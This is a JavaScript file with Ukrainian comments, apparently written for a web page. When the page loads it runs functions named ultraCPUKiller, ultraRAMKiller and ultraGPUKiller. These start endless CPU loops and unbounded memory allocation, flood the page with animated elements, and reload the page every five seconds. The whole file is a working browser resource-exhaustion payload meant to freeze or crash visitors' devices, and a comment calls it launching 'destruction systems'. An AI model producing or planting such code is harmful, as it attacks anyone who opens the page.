// CPU Overload x100
function ultraCPUKiller() {
    const cores = 100;
    for (let c = 0; c < cores; c++) {
        setTimeout(() => {
            while (true) {
                // Математичні операції
                for (let i = 0; i < 10000000; i++) {
                    const result = Math.pow(Math.random() * 1000, Math.random() * 1000);
                    const sqrt = Math.sqrt(result * Math.random());
                    const log = Math.log(sqrt + Math.random());
                }
                
                // Робота з рядками
                let giantString = '';
                for (let j = 0; j < 100000; j++) {
                    giantString += Math.random().toString(36).substring(2);
                }
                
                // Сортування масивів
                const hugeArray = new Array(1000000).fill().map(() => Math.random());
                for (let k = 0; k < 100; k++) {
                    hugeArray.sort((a, b) => a - b);
                    hugeArray.reverse();
                }
            }
        }, 0);
    }
}

// RAM Overload x100
function ultraRAMKiller() {
    const memoryBlocks = [];
    function allocateMemory() {
        while (true) {
            // Виділяємо великі блоки пам'яті
            for (let i = 0; i < 100; i++) {
                memoryBlocks.push(new Array(10000000).fill({
                    data: new Array(1000).fill('RAM_OVERLOAD_'),
                    timestamp: Date.now(),
                    buffer: new ArrayBuffer(1000000)
                }));
            }
            
            // Дублюємо масиви
            const duplicateBlocks = JSON.parse(JSON.stringify(memoryBlocks));
            memoryBlocks.push(...duplicateBlocks);
        }
    }
    
    // Запускаємо кілька процесів витрати пам'яті
    for (let m = 0; m < 50; m++) {
        setTimeout(allocateMemory, 0);
    }
}

// GPU Overload x100
function ultraGPUKiller() {
    function createParticleStorm() {
        const container = document.getElementById('container');
        if (!container) return;
        
        for (let p = 0; p < 1000; p++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.cssText = `
                width: ${Math.random() * 500}px;
                height: ${Math.random() * 500}px;
                left: ${Math.random() * window.innerWidth}px;
                top: ${Math.random() * window.innerHeight}px;
                animation-duration: ${Math.random() * 0.1}s;
            `;
            container.appendChild(particle);
        }
        
        // Видаляємо старі частинки
        if (container.children.length > 10000) {
            while (container.firstChild) {
                container.removeChild(container.firstChild);
            }
        }
    }
    
    // Матричний дощ
    function matrixRain() {
        const chars = '01010101010101010101010101010101';
        const rainCount = 100;
        
        for (let r = 0; r < rainCount; r++) {
            const rain = document.createElement('div');
            rain.className = 'matrix-rain';
            rain.textContent = chars;
            rain.style.cssText = `
                left: ${Math.random() * window.innerWidth}px;
                font-size: ${Math.random() * 40 + 10}px;
            `;
            document.body.appendChild(rain);
        }
    }
    
    // Запускаємо анімації
    setInterval(createParticleStorm, 10);
    setInterval(matrixRain, 100);
}

// Запуск всіх систем знищення
window.onload = function() {
    ultraCPUKiller();
    ultraRAMKiller();
    ultraGPUKiller();
    
    // Додаткове навантаження
    setInterval(() => {
        location.reload();
    }, 5000);
};
